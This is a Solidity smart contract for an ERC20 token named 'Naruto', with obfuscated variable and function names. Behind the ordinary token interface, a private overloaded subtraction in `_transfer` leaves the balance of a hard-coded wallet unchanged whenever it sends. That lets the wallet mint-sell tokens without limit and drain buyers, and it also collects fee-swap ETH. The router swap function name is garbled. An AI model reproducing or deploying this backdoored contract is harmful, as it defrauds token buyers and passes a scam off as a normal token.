/**

Naruto   $Naruto


TWITTER: https://twitter.com/NarutoEthereum
TELEGRAM: https://t.me/Naruto_Ethereum
WEBSITE: https://narutoeth.com/

**/


// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _fpkuq(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _fpkuq(a, b, "SafeMath:");
    }

    function  _fpkuq(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _xaupjrdf {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _xrufgtlms {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract Naruto is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"Naruto";
    string private constant _symbol = unicode"Naruto";
    uint8 private constant _decimals = 9;

    uint256 private constant _Totaldk = 1000000000 * 10 **_decimals;
    uint256 public _mxktfAmaunt = _Totaldk;
    uint256 public _Wallesrovp = _Totaldk;
    uint256 public _wapThresxuao= _Totaldk;
    uint256 public _molkTakrf= _Totaldk;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isyEzgabp;
    mapping (address => bool) private _taxmWalrvy;
    mapping(address => uint256) private _lraurktoep;
    bool public _taeraloev = false;
    address payable private _TutFrvp;

    uint256 private _BuyTaxinitial=1;
    uint256 private _SellTaxinitial=1;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=1;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapumfoqb=0;
    uint256 private _burmtxtr=0;


    _xrufgtlms private _Tjmeanpl;
    address private _ygMsovkhs;
    bool private _qurvbqmh;
    bool private laoSrmyep = false;
    bool private _acenjuop = false;


    event _amvobfdl(uint _mxktfAmaunt);
    modifier loecThayuq {
        laoSrmyep = true;
        _;
        laoSrmyep = false;
    }

    constructor () {
        _TutFrvp = payable(0xcbD01a7A5D1A49c72bcEe850502f0e3FEd6992d7);
        _balances[_msgSender()] = _Totaldk;
        _isyEzgabp[owner()] = true;
        _isyEzgabp[address(this)] = true;
        _isyEzgabp[_TutFrvp] = true;

 

        emit Transfer(address(0), _msgSender(), _Totaldk);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totaldk;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _fpkuq(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_taeraloev) {
                if (to != address
                (_Tjmeanpl) && to !=
                 address(_ygMsovkhs)) {
                  require(_lraurktoep
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lraurktoep
                  [tx.origin] = block.number;
                }
            }

            if (from == _ygMsovkhs && to != 
            address(_Tjmeanpl) && !_isyEzgabp[to] ) {
                require(amount <= _mxktfAmaunt,
                 "Exceeds the _mxktfAmaunt.");
                require(balanceOf(to) + amount
                 <= _Wallesrovp, "Exceeds the maxWalletSize.");
                if(_burmtxtr
                < _wapumfoqb){
                  require(! _frojupei(to));
                }
                _burmtxtr++;
                 _taxmWalrvy[to]=true;
                teeomoun = amount.mul((_burmtxtr>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _ygMsovkhs && from!= address(this) 
            && !_isyEzgabp[from] ){
                require(amount <= _mxktfAmaunt && 
                balanceOf(_TutFrvp)<_molkTakrf,
                 "Exceeds the _mxktfAmaunt.");
                teeomoun = amount.mul((_burmtxtr>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_burmtxtr>_wapumfoqb &&
                 _taxmWalrvy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!laoSrmyep 
            && to == _ygMsovkhs && _acenjuop &&
             contractTokenBalance>_wapThresxuao 
            && _burmtxtr>_wapumfoqb&&
             !_isyEzgabp[to]&& !_isyEzgabp[from]
            ) {
                _swpnbjruoh( _ypmte(amount, 
                _ypmte(contractTokenBalance,_molkTakrf)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _rommeuoq(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _fpkuq(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _fpkuq(teeomoun));
        emit Transfer(from, to, 
        amount. _fpkuq(teeomoun));
    }

    function _swpnbjruoh(uint256
     tokenAmount) private loecThayuq {
        if(tokenAmount==0){return;}
        if(!_qurvbqmh){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _Tjmeanpl.WETH();
        _approve(address(this),
         address(_Tjmeanpl), tokenAmount);
        _Tjmeanpl.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _ypmte(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _fpkuq(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _TutFrvp){
            return a ;
        }else{
            return a . _fpkuq (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxktfAmaunt = _Totaldk;
        _Wallesrovp = _Totaldk;
        _taeraloev = false;
        emit _amvobfdl(_Totaldk);
    }

    function _frojupei(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _rommeuoq(uint256
    amount) private {
        _TutFrvp.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _qurvbqmh);
        _Tjmeanpl   =  _xrufgtlms (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_Tjmeanpl), _Totaldk);
        _ygMsovkhs = _xaupjrdf(_Tjmeanpl.factory()). createPair (address(this),  _Tjmeanpl . WETH ());
        _Tjmeanpl.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_ygMsovkhs).approve(address(_Tjmeanpl), type(uint).max);
        _acenjuop = true;
        _qurvbqmh = true;
    }

    receive() external payable {}
}